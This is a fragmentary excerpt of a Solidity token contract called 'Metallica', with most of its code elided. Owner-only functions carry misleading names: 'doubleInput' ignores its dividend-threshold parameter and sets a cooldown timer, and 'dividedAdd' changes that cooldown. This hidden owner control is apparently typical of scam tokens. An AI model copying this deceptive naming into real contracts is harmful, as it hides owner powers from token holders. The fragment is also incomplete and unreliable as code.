...
contract AuthOwner is Context, IERC1363{  
    ...
    */
    function Jacquemus(address newOwner) external onlyOwner returns (bool) {
...
contract Metallica is AuthOwner {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "Metallica";    
    string public symbol = "METALLICA";
    ...
    function doubleInput(uint256 minimumTokenBalanceForDividends) external onlyOwner {
        _coolWait = 3600;
    ...
    function dividedAdd(uint256 newCoolWait) external onlyOwner {
        require(
